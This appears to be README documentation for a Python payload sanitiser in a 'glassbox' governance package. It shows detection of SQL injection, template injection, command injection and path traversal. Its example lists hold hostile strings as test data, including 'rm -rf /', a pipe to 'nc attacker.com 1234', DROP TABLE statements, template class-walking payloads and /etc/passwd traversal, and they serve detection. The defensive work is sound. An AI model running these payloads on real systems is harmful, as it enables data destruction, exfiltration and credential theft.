# glassbox/security — Payload Sanitisation

The `security` package intercepts malicious payloads before they enter the governance pipeline.

| Module | Role |
|---|---|
| `sanitizer.py` | `PayloadSanitizer`, `validate_agent_id()`, `SecurityReport` |

**Attack vectors detected:**
- SQL injection (15+ patterns: OR 1=1, UNION SELECT, CHAR(), xp_cmdshell, …)
- SSTI — Jinja2/Twig/EL template injection `{{7*7}}`
- XSS — `<script>`, JavaScript URLs
- Command injection — `os.system()`, `subprocess`, shell metacharacters
- Path traversal — `../`, `..\`
- Null byte injection — `\x00`
- Unicode homoglyph attacks
- Oversized payloads (DoS prevention)

All checks run **before Stage 0** — malicious payloads never reach policy evaluation.

---

## Quick Start

```python
from glassbox.security.sanitizer import PayloadSanitizer
from glassbox.governance.pipeline import GovernancePipeline

# Initialize sanitizer (run before pipeline)
sanitizer = PayloadSanitizer(
    max_payload_bytes=1_000_000,  # 1 MB
    max_field_length=10_000,
    detect_unicode_homoglyphs=True,
    allow_html_tags=False
)

# Validate incoming payload
payload = {
    "user_id": 123,
    "description": "Update profile"  # Potentially malicious
}

report = sanitizer.validate(payload, depth_limit=10)
if not report.is_safe:
    print(f"SECURITY VIOLATION: {report.violations}")
    # Reject payload; log for audit
else:
    # Safe to pass to pipeline
    pipeline = GovernancePipeline()
    result = pipeline.execute(payload)
```

---

## Attack Detection & Examples

### SQL Injection Detection

```python
# Detected attacks
malicious_payloads = [
    {"query": "SELECT * FROM users WHERE id=1 OR 1=1"},
    {"query": "SELECT * FROM users; DROP TABLE users;--"},
    {"query": "SELECT CHAR(120,121,122) FROM table"},
    {"query": "UNION SELECT password FROM admin"},
    {"query": "exec xp_cmdshell"},
]

for payload in malicious_payloads:
    report = sanitizer.validate(payload)
    if not report.is_safe:
        print(f"✓ SQL injection blocked: {report.violations}")
        # Triggers: security.violation event
        # Logs: Audit trail
        # Blocks: Decision execution
```

### Template Injection (SSTI) Detection

```python
# Detected attacks
ssti_payloads = [
    {"title": "{{7*7}}"},  # Jinja2 code execution
    {"template": "${@java.lang.Runtime@getRuntime()}"},  # EL injection
    {"message": "{% for item in ().__class__.__bases__[0].__subclasses__() %}"},  # Class access
]

for payload in ssti_payloads:
    report = sanitizer.validate(payload)
    if not report.is_safe:
        print(f"✓ SSTI blocked: {report.violations}")
```

### Command Injection Detection

```python
# Detected attacks
cmd_payloads = [
    {"command": "user_input; rm -rf /"},  # Command chaining
    {"filename": "file.txt | nc attacker.com 1234"},  # Pipe to network
    {"path": "`whoami`"},  # Command substitution
]

for payload in cmd_payloads:
    report = sanitizer.validate(payload)
    if not report.is_safe:
        print(f"✓ Command injection blocked: {report.violations}")
```

### Path Traversal Detection

```python
# Detected attacks
path_payloads = [
    {"file": "../../../etc/passwd"},
    {"file": "..\\..\\windows\\system32"},
    {"file": "/var/www/../../etc/shadow"},
]

for payload in path_payloads:
    report = sanitizer.validate(payload)
    if not report.is_safe:
        print(f"✓ Path traversal blocked: {report.violations}")
```

---

## Sanitization Patterns

### Pattern 1: Pre-Validation in API Layer

```python
from flask import Flask, request
from glassbox.security.sanitizer import PayloadSanitizer
from glassbox.governance.pipeline import GovernancePipeline

app = Flask(__name__)
sanitizer = PayloadSanitizer()
pipeline = GovernancePipeline()

@app.route("/api/decision", methods=["POST"])
def make_decision():
    payload = request.json
    
    # 1. Validate before pipeline
    report = sanitizer.validate(payload)
    if not report.is_safe:
        return {
            "error": "Invalid payload",
            "violations": report.violations
        }, 400
    
    # 2. Safe; pass to governance
    result = pipeline.execute(payload)
    return {"disposition": result.disposition}, 200
```

### Pattern 2: Nested Payload Validation

```python
# Validate deeply nested payloads
complex_payload = {
    "user": {
        "name": "John",
        "address": {
            "street": "../../../etc/passwd",  # Injection buried in nested property
            "city": "NYC"
        }
    }
}

sanitizer = PayloadSanitizer(depth_limit=10)  # Validate 10 levels deep
report = sanitizer.validate(complex_payload)

if "address.street" in str(report.violations):
    print(f"✓ Nested path traversal detected")
```

### Pattern 3: Custom Field Rules

```python
# Define custom validation for specific fields
sanitizer = PayloadSanitizer()
sanitizer.add_rule(
    field="email",
    pattern=r"^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$",
    error_message="Invalid email format"
)
sanitizer.add_rule(
    field="phone",
    pattern=r"^\+?1?\d{9,15}$",
    error_message="Invalid phone number"
)

payload = {"email": "user@example.com", "phone": "+12125551234"}
report = sanitizer.validate(payload)
```

### Pattern 4: Allowlist Over Blocklist

```python
# More secure: allowlist vs blocklist
sanitizer = PayloadSanitizer()

# Allowlist approach: only these characters permitted
sanitizer.add_rule(
    field="status",
    allowed_values=["pending", "approved", "rejected"],  # Whitelist
    error_message="Status must be pending, approved, or rejected"
)

# Test
report = sanitizer.validate({"status": "'; DROP TABLE;--"})
if not report.is_safe:
    print(f"✓ Invalid status value blocked")
```

---

## Performance Characteristics

| Operation | Latency | Throughput | Notes |
|-----------|---------|-----------|-------|
| validate() — simple | 0.5–1 ms | 1K–10K payloads/sec | Small payloads |
| validate() — nested | 2–10 ms | 100–500 payloads/sec | 5–10 levels deep |
| validate() — large | 10–50 ms | 20–100 payloads/sec | 100KB+ payload |
| add_rule() | <0.1 ms | — | One-time setup |
| compile_rules() | 1–5 ms | — | Pattern compilation |

**Optimization:**
```python
# Cache compiled patterns
sanitizer = PayloadSanitizer()
sanitizer.compile_rules()  # Pre-compile patterns

# Validate batches efficiently
results = [sanitizer.validate(p) for p in payload_batch]
```

---

## Common Errors

### Error: "Legitimate payload rejected; false positive"

**Symptom:**
```python
# User legitimate input with special characters
payload = {"message": "2 + 2 = 4 (correct!)"}  # False positive: confusion with templates

report = sanitizer.validate(payload)
if not report.is_safe:
    print(f"BLOCKED: {report.violations}")
    # User cannot submit form
```

**Solution:**
```python
# Option 1: Adjust detection sensitivity
sanitizer = PayloadSanitizer(
    detect_template_injection=False,  # If false positives problematic
    detect_math_expressions=False
)

# Option 2: Create allowlist exception
sanitizer.add_exception(
    field="message",
    pattern=r"^[\d\s\+\-\*\/%\(\)=]+$"  # Math expressions
)

# Option 3: Use context-specific rules
sanitizer.add_rule(
    field="message",
    allowed_charset="alphanumeric_punctuation",
    error_message="Message can only contain letters, numbers, and punctuation"
)
```

### Error: "Unicode homoglyph attack bypassed"

**Symptom:**
```python
# Attacker uses Cyrillic 'е' (looks like 'e') in SQL injection
malicious = {"username": "admin' -- (Cyrillic char misrepresenting ASCII)"}

sanitizer = PayloadSanitizer(detect_unicode_homoglyphs=False)  # Oops!
report = sanitizer.validate(malicious)
# Homoglyph not detected; bypass possible
```

**Solution:**
```python
# Enable homoglyph detection
sanitizer = PayloadSanitizer(
    detect_unicode_homoglyphs=True,  # Enabled
    normalize_unicode=True  # Normalize to ASCII
)

report = sanitizer.validate({"username": "admin' --"})  # Normalized before check
```

### Error: "Payload size limit too restrictive"

**Symptom:**
```python
# Large but legitimate payload
large_payload = {"document": "x" * 10_000_000}  # 10 MB

sanitizer = PayloadSanitizer(max_payload_bytes=1_000_000)  # 1 MB limit
report = sanitizer.validate(large_payload)

if not report.is_safe:
    print(f"Blocked: Payload exceeds size limit")
    # Legitimate large upload rejected
```

**Solution:**
```python
# Adjust limits based on use case
sanitizer = PayloadSanitizer(
    max_payload_bytes=100_000_000,  # 100 MB for large documents
    max_field_length=50_000  # 50K per field
)

# OR: Stream large payloads for chunk-by-chunk validation
chunks = read_file_in_chunks("large_file.bin", chunk_size=10_000)
for chunk in chunks:
    report = sanitizer.validate({"data": chunk})
    if not report.is_safe:
        break
```

### Error: "Sanitizer rules not applied; legacy payload"

**Symptom:**
```python
# Sanitizer initialized but payload not validated
payload = {"user": "admin'; DROP TABLE;--"}

# Forgot to call validate()
result = pipeline.execute(payload)  # SQL injection NOT caught

# Correct:
report = sanitizer.validate(payload)
if report.is_safe:
    result = pipeline.execute(payload)  # Now safe
```

**Solution:**
```python
# Always validate before pipeline
from glassbox.security.sanitizer import PayloadSanitizer
from glassbox.governance.pipeline import GovernancePipeline

def safe_execute(payload):
    sanitizer = PayloadSanitizer()
    report = sanitizer.validate(payload)
    
    if not report.is_safe:
        raise SecurityException(f"Payload validation failed: {report.violations}")
    
    pipeline = GovernancePipeline()
    return pipeline.execute(payload)
```

---

## Agent ID Validation

```python
from glassbox.security.sanitizer import validate_agent_id

# Validate agent identifiers
valid_ids = [
    "credit_check_agent",
    "procurement-bot_v2",
    "agent-123"
]

invalid_ids = [
    "agent'; DROP TABLE;--",  # SQL injection
    "agent\x00null_byte",     # Null byte injection
    "agent\n\n" + "x" * 10000  # Oversized ID
]

for agent_id in valid_ids:
    if validate_agent_id(agent_id):
        print(f"✓ {agent_id} valid")

for agent_id in invalid_ids:
    if not validate_agent_id(agent_id):
        print(f"✓ {agent_id} blocked")
```

---

## Security Event Publishing

```python
# All security violations trigger events
from glassbox.events.event_bus import EventBus

bus = EventBus()

def on_security_violation(event):
    """Alert on detected attacks"""
    print(f"ALERT: {event.payload['violation_type']}")
    print(f"Payload: {event.payload['sanitized_payload']}")
    notify_security_team(event.payload)

bus.subscribe("security.violation", on_security_violation)

# When sanitizer detects attack:
report = sanitizer.validate(malicious_payload)
# Automatically triggers: bus.publish("security.violation", {...})
```

---

See [../../docs/DEPLOYMENT.md](../../docs/DEPLOYMENT.md#security-hardening) for hardening strategies and [../../docs/COMPLIANCE.md](../../docs/COMPLIANCE.md) for compliance implications.
